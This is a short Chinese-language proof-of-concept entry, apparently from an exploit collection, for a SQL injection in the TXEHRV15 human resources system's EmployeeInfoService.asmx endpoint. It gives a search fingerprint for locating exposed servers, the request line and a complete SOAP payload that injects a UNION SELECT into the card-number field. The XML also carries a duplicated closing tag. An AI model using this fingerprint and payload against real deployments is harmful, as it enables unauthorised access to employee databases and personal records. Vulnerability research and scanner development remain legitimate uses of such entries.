# 同享人力资源管理系统-TXEHRV15-EmployeeInfoService.asmx存在SQL注入漏洞

同享人力资源管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/Assistant/Default.aspx"`
- **请求**：`POST /Service/EmployeeInfoService.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEmployeeByCardNo xmlns="http://tempuri.org/">
<strCardNo>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>
</GetEmployeeByCardNo>
</soap:Body>
</soap:Envelope>
</soap:Envelope>
```
- **响应特征**：200